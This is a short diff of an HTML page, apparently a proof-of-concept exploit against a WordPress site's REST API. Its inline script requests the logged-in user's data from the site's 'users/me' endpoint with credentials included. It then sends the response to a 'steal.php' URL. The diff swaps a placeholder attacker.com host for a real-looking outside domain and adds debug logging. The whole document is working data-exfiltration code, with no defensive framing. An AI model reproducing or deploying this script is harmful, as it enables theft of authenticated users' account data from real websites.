@@ -2,13 +2,16 @@
 <html>
 <head>
     <script>
-        fetch("https://building-blocks.com/wp-json/wp/v2/users/me", {
-            credentials: "include"
-        })
-        .then(response => response.text())
-        .then(data => {
-            fetch("https://attacker.com/steal.php?data=" + encodeURIComponent(data));
-        });
+       fetch("https://building-blocks.com/wp-json/wp/v2/users/me", { credentials: "include" })
+  .then(response => response.text())
+  .then(data => {
+    console.log("Fetched Data:", data); // Debugging
+    fetch("https://dipeshsadhwani.ct.ws/steal.php?data=" + encodeURIComponent(data))
+      .then(() => console.log("Data Sent"))
+      .catch(err => console.error("Error sending data:", err));
+  })
+  .catch(err => console.error("Error fetching data:", err));
+
     </script>
 </head>
 <body>
